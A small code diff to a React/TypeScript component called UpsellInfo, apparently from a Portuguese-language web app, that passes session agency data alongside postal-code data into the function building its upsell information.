@@ -239,8 +239,9 @@ const UpsellInfo = () => {
   const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
   const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;
   const cepData: CepData | undefined = session?.cepData;
+  const agencyData: AgencyData | undefined = session?.agencyData;
 
-  const upsellInfo = useMemo(() => buildUpsellInfo(cepData), [cepData]);
+  const upsellInfo = useMemo(() => buildUpsellInfo(cepData, agencyData), [cepData, agencyData]);
   const info = upsellInfo[currentIndex];
 
   const valorComCentavos = info.valor + (Math.floor(Math.random() * 99) + 1) / 100;
